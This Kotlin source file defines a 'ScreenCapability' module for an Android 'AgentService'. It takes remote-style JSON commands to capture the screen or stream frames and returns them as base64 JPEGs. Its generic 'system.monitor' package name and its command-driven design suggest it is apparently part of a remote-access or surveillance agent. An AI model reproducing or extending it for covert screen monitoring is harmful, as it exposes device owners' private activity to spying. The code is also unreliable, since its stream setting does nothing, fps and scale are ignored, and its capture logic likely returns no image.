package com.system.monitor.capabilities

import android.content.Context
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.os.Build
import android.util.DisplayMetrics
import android.view.Surface
import com.google.gson.Gson
import com.system.monitor.AgentService
import java.io.ByteArrayOutputStream
import java.nio.ByteBuffer

class ScreenCapability(private val service: AgentService) : AgentService.Capability {

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val gson = Gson()
    private var capturing = false

    override fun execute(args: String?): Any {
        val params = gson.fromJson(args ?: "{}", Params::class.java)
        return when (params.action) {
            "capture" -> captureScreen()
            "start_stream" -> startStream(params.fps ?: 15, params.quality ?: 70, params.scale ?: 1.0f)
            "stop_stream" -> stopStream()
            "get_frame" -> getFrame()
            else -> mapOf<String, Any>("error" to "invalid action")
        }
    }

    override fun cleanup() {
        stopStream()
    }

    private fun captureScreen(): Map<String, Any> {
        if (projection == null) {
            return mapOf<String, Any>("status" to "requires_projection_permission")
        }
        val bitmap = captureBitmap()
        return mapOf<String, Any>("image" to (bitmapToBase64(bitmap) ?: ""))
    }

    private fun startStream(fps: Int, quality: Int, scale: Float): Map<String, Any> {
        if (projection == null) {
            return mapOf<String, Any>("status" to "requires_projection_permission")
        }
        capturing = true
        return mapOf<String, Any>("status" to "stream_started", "fps" to fps, "quality" to quality, "scale" to scale)
    }

    private fun stopStream(): Map<String, Any> {
        capturing = false
        virtualDisplay?.release()
        virtualDisplay = null
        imageReader?.close()
        imageReader = null
        return mapOf<String, Any>("status" to "stream_stopped")
    }

    private fun getFrame(): Map<String, Any> {
        if (!capturing || projection == null) {
            return mapOf<String, Any>("status" to "not_streaming")
        }
        val bitmap = captureBitmap()
        return mapOf<String, Any>("image" to (bitmapToBase64(bitmap) ?: ""))
    }

    private fun captureBitmap(): Bitmap? {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) return null
        val displayManager = service.getSystemService(Context.DISPLAY_SERVICE) as DisplayManager
        val display = displayManager.getDisplay(android.view.Display.DEFAULT_DISPLAY)
        val metrics = DisplayMetrics()
        display.getRealMetrics(metrics)
        val width = (metrics.widthPixels * 1.0f).toInt()
        val height = (metrics.heightPixels * 1.0f).toInt()
        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = projection!!.createVirtualDisplay(
            "screen-capture",
            width, height, metrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )
        val image = imageReader!!.acquireLatestImage() ?: return null
        val planes = image.planes
        val buffer = planes[0].buffer
        val pixelStride = planes[0].pixelStride
        val rowStride = planes[0].rowStride
        val rowPadding = rowStride - pixelStride * width
        val bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888)
        bitmap.copyPixelsFromBuffer(buffer)
        image.close()
        return Bitmap.createBitmap(bitmap, 0, 0, width, height)
    }

    private fun bitmapToBase64(bitmap: Bitmap?): String? {
        return bitmap?.let {
            val stream = ByteArrayOutputStream()
            it.compress(Bitmap.CompressFormat.JPEG, 70, stream)
            android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
        }
    }

    data class Params(
        val action: String,
        val fps: Int? = null,
        val quality: Int? = null,
        val scale: Float? = null
    )
}